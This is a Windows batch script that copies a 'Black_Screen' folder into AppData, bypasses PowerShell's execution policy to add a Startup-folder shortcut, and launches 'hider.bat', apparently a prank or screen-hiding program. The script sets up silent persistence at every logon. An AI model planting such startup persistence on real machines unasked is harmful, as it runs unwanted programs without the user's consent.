@rem Copie les fichiers et les execute à chaque démarrage
@echo off

echo Copy the file to AppData\Black_Screen
xcopy /s Code %AppData%\Black_Screen /Y /I

echo.
echo Create Shortcut
set TARGET='%AppData%\Black_Screen\hider.bat'
set SHORTCUT='%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\black_screen.lnk'
set PWS=powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
%PWS% -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(%SHORTCUT%); $S.TargetPath = %TARGET%; $S.Save()"

"%APPDATA%\Black_Screen\hider.bat"
exit